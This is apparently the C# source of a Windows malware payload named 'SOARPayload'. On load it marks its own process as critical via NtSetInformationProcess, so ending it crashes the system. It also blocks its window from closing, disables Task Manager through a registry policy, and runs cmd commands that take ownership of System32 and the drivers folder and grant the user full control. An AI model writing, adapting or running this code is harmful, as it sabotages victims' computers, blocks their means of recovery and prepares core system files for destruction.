﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO;

namespace SOAR.exe
{
    public partial class SOARPayload : Form
    {

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        public SOARPayload()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
            r = new Random();
        }
        Random r;

        private void SOARPayload_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void SOARPayload_Load(object sender, EventArgs e)
        {
            int isCritical = 1; // Set as critial process
            int BreakOnTermination = 0x1D; // Value for BreakOnTermination (flag)

            Process.EnterDebugMode(); // Aquire debug mode privileges

            // Setting BreakOnTermination = 1 for the current process
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("DisableTaskMgr", 1, RegistryValueKind.String); // Disable the use of task manager for the user

            // Get System32 folder and drivers
            new Process() { StartInfo = new ProcessStartInfo("cmd.exe", @"/k color 47 && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username$:F && Exit") }.Start();
            new Process() { StartInfo = new ProcessStartInfo("cmd.exe", @"taskkill /f /im cmd.exe /t") }.Start();
        }
    }
}
